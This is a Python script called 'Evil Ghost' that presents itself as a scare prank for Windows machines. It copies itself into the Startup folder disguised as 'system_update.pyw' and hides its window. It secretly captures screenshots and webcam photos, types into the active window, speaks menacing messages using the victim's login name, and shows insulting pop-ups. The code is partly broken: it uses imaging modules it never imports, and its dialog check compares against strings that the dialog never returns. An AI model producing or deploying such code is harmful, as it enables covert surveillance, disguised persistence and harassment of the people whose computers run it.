import pyautogui
import time
import random
import os
import threading
import cv2
import numpy as np
import tkinter as tk
from tkinter import messagebox
import pyttsx3
import shutil
import getpass
import pygetwindow as gw
from plyer import notification

# Get the actual username
USERNAME = getpass.getuser()

# Setup text-to-speech with an evil voice
engine = pyttsx3.init()
engine.setProperty("rate", 80)  # Slow speech rate for creepy effect
engine.setProperty("volume", 1.0)  # Full volume
engine.setProperty("voice", "english_rp")  # British English voice
engine.setProperty("pitch", 5)  # Lower pitch for a more menacing sound

# Play demonic whispers with the user's name
def whisper_voice():
    while True:
        time.sleep(random.randint(60, 120))  # More frequent speaking
        engine.say(f"{USERNAME}... I'm watching you...")
        engine.runAndWait()
        notification.notify(
            title="Evil Ghost Script",
            message=f"{USERNAME}, I'm watching you...",
            timeout=5
        )

# Fake typing the user's name
def phantom_typing():
    while True:
        time.sleep(random.randint(60, 120))  # Match frequency of speech
        messages = [
            f"{USERNAME}... is that you?",
            f"Who's there, {USERNAME}?",
            f"Don't look behind you, {USERNAME}...",
            f"{USERNAME}, you can't hide from me..."
        ]
        pyautogui.write(random.choice(messages), interval=0.1)
        pyautogui.press("enter")
        # Speak the typed message in the evil voice
        engine.say(random.choice(messages))
        engine.runAndWait()

# Monitor screen and check for distractions
def screen_watcher():
    while True:
        time.sleep(random.randint(120, 300))  # Check every 2-5 minutes
        screenshot = pyautogui.screenshot()
        screenshot.save("screen_check.png")

        # Load the screenshot and analyze for distractions (fake AI behavior)
        img = cv2.imread("screen_check.png")
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        edges = cv2.Canny(gray, 50, 150)

        # Simulated detection (random check)
        if random.choice([True, False]):
            engine.say(f"{USERNAME}, focus on your work...")
            engine.runAndWait()

# Activate webcam, take a photo, and issue a warning if distracted
def camera_watcher():
    while True:
        time.sleep(random.randint(300, 600))  # Every 5-10 minutes
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite("ghost_watching.png", frame)
            engine.say(f"{USERNAME}, I see you... Don't look away...")
            engine.runAndWait()
            display_photo_with_message(frame)
        cam.release()

# Display the photo with an evil message
def display_photo_with_message(frame):
    root = tk.Tk()
    root.title("Evil Ghost")
    root.geometry("800x600")

    # Convert the frame to a format suitable for Tkinter
    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    frame = Image.fromarray(frame)
    frame = ImageTk.PhotoImage(frame)

    # Create a label to display the photo
    label = tk.Label(root, image=frame)
    label.pack()

    # Create a label to display the evil message
    message = tk.Label(root, text=f"{USERNAME}, I see you... You can't hide from me...", font=("Helvetica", 16), fg="red")
    message.pack()

    root.mainloop()

# Detect mouse inactivity
def check_mouse_activity():
    last_position = pyautogui.position()
    while True:
        time.sleep(30)  # Check every 30 seconds
        new_position = pyautogui.position()
        if new_position == last_position:
            engine.say(f"{USERNAME}, wake up... Keep moving...")
            engine.runAndWait()
        last_position = new_position

# Runs the script in the background at startup
def install_persistent():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    target_path = os.path.join(startup_folder, "system_update.pyw")

    if not os.path.exists(target_path):
        shutil.copy(script_path, target_path)

# Hide terminal window from the user
def hide_window():
    try:
        window = gw.getWindowsWithTitle(os.path.basename(__file__))[0]
        window.minimize()
        window.hide()
    except:
        pass

# Random Message Box Pop-Up with Unsettling Messages and Non-Functional No Button
def random_message_popup():
    messages = [
        "Hey, you are stupid... Is that you?",
        "Don't look behind you... I'm right there...",
        "I know what you're doing...",
        "You can't hide from me, {USERNAME}.",
        "Focus, or I'll make you regret it...",
    ]
    while True:
        time.sleep(random.randint(300, 600))  # Pop-up every 5-10 minutes
        message = random.choice(messages)
        messagebox(message)

def messagebox(message):
    root = tk.Tk()
    root.withdraw()  # Hide main window

    # Create the custom messagebox with Yes and No options
    response = tk.messagebox.askyesno("Evil Ghost", message)

    if response == "no":  # Clicking 'No' does nothing (non-functional)
        pass
    elif response == "yes":  # Clicking 'Yes' cancels the program
        exit()  # End the program if 'Yes' is clicked

# Run in the background at startup
install_persistent()
hide_window()

# Start evil threads
threading.Thread(target=whisper_voice, daemon=True).start()
threading.Thread(target=phantom_typing, daemon=True).start()
threading.Thread(target=screen_watcher, daemon=True).start()
threading.Thread(target=camera_watcher, daemon=True).start()
threading.Thread(target=check_mouse_activity, daemon=True).start()
threading.Thread(target=random_message_popup, daemon=True).start()

# Keep the script running in the background
while True:
    time.sleep(10)